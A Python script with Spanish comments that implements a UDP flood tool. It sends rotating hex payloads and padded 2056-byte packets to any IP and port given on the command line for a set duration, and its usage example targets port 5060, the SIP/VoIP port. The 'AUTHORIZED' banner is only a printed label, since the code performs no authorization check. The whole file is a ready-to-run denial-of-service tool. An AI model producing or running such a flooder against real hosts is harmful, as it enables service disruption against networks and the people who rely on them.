#!/usr/bin/env python3
import socket
import sys
import time
import random

# Payloads pequeños (rotación)
small_payloads = [
    bytes.fromhex('849a00004000487400000000000000a269'),
    bytes.fromhex('84a000004000487400000000000000a269'),
    bytes.fromhex('848c00004000487400000000000000a269'),
    bytes.fromhex('848a000000004800000000000000b71c'),
    bytes.fromhex('848800004000487400000000000000a269'),
    bytes.fromhex('848700004000487400000000000000a269'),
    bytes.fromhex('840100006002f0010000000000001304e840b7c963a40480fffffe63a404ffffff000004ffffffffff')
]

# 10 payloads FLOOD de 2056B (variaciones del grande)
flood_payloads = []
base_header = bytes.fromhex('0500ffff00fefefffffdfdfdfdfd123456780800')

for i in range(10):
    # Header único + padding hasta exactamente 2056B
    unique_bytes = bytes([i % 256, (i*2) % 256, (i*4) % 256, i % 256])
    header = base_header + unique_bytes + b'\x00' * (32 - len(unique_bytes))
    payload = header + b'\x00' * (2056 - len(header))
    flood_payloads.append(payload)

def send_udp(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    end_time = time.time() + duration
    count = 0
    flood_count = 0
    
    print(f"[+] AUTHORIZED UDP FLOOD: {target_ip}:{target_port} x {duration}s")
    print(f"[+] {len(flood_payloads)}x 2056B + {len(small_payloads)}x pequeños")
    
    try:
        while time.time() < end_time:
            # 80% FLOOD pesado (2056B)
            if random.random() < 0.8:
                payload = random.choice(flood_payloads)
                flood_count += 1
            # 20% payloads pequeños
            else:
                payload = random.choice(small_payloads)
            
            sock.sendto(payload, (target_ip, target_port))
            count += 1
            
            # ~1000pps máximo
            time.sleep(0.001)
            
    except KeyboardInterrupt:
        pass
    
    mb_sent = (flood_count * 2056 + (count - flood_count) * 50) / (1024*1024)
    print(f"\n[+] {count:,} paq | {flood_count:,} FLOOD | {mb_sent:.1f}MB | {duration}s")
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python3 udp_flood.py <IP> <PORT> <SEGUNDOS>")
        print("Ej: python3 udp_flood.py 192.168.1.100 5060 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    send_udp(target_ip, target_port, duration)
